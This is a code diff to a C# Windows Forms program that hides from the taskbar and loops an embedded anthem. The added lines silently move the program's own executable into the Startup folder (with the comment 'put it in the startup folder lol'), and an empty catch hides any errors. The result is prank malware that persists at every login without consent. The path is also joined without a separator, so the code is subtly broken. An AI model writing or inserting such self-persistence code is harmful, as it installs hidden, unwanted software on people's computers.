@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -50,7 +51,17 @@ namespace WindowsFormsApp1
             this.ShowInTaskbar = false;
             System.IO.Stream str = Properties.Resources.sound;
             System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
+            MessageBox.Show(System.AppDomain.CurrentDomain.FriendlyName);
+            string fileName = System.AppDomain.CurrentDomain.FriendlyName;
+            string sourcePath = @AppDomain.CurrentDomain.BaseDirectory;
+            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
+            try //put it in the startup folder lol
+            {
+                File.Move(sourceFile, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + System.AppDomain.CurrentDomain.FriendlyName);
+            }
+            catch { }
             snd.PlayLooping(); // play the great soviet union anthem. 
+
         }
 
         private void timer1_Tick(object sender, EventArgs e)
